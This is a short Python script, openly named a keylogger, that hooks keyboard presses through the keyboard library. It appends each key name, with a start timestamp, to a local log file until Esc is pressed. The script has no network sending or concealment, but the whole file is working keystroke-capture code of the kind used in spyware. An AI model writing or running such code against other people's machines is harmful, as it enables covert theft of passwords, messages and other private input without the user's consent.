import os
import sys
import time
import keyboard

#Global Variables
log_file = "logs/keylog.txt"

class keylogger:
  
    def create_log(self):
        with open(log_file, "w") as f:
            f.write(f"Keylogger started at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        keyboard.on_press(self.grab_keys)

    def grab_keys(self, event):
        with open(log_file, "a") as f:
            f.write(f"Key pressed: {event.name}\n")
        
    def start(self):
        self.create_log()
        keyboard.wait('esc')

if __name__ == "__main__":
    keylogger = keylogger()
    keylogger.start()
   